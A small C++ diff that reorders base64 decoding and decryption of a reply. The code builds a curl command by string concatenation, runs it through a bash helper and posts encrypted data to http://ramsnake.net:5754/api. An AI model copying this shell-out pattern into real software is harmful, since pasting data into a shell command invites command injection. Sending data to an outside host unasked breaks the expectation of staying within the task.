@@ -36,8 +36,8 @@ public:
 
       std::string addr = "http://ramsnake.net:5754/api";
       std::string curlcmd = "curl -s -X POST --data '" + encrypted + "' " + addr;
-      
-      return base64_decode(mCodec.decrypt(bash(curlcmd)));      
+
+      return mCodec.decrypt(base64_decode(bash(curlcmd)));      
    }
 
 private:
